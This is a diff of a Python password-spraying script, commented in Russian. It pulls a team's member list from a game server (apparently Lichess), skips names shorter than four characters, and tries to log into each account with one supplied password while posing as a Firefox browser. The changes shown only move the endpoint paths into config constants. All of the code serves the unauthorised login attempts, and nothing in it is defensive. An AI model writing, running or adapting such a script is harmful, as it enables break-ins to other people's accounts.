@@ -6,7 +6,7 @@ from config import *
 
 def start(password, team):
     print(yellow + "[..] Получаем список, это может занять некоторое время...")
-    r_m = requests.get(f'https://{SERVER}/api/team/' + team + '/users')
+    r_m = requests.get(f'https://{SERVER}/api/{TEAM}/' + team + f'/{USERS}')
     users = r_m.json(cls=ndjson.Decoder)
 
     # Выводим сообщение, что список готов
@@ -23,9 +23,9 @@ def start(password, team):
         #   Получаем ник участника
         username = user["username"]
 
-        if (len(username) < 4): continue
+        if (len(username) < 4): continue # проверка на работоспособность имени пользователя, имя пользователя на личесе минимум из 4-х символов
 
-        r = requests.post(f"https://{SERVER}/login",
+        r = requests.post(f"https://{SERVER}/{LOGIN}",
                           data={"username": username, "password": password, "remember": "true"},
                           headers={"X-Requested-With": "XMLHttpRequest",
                                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"}) # пытатаемся войти в акк
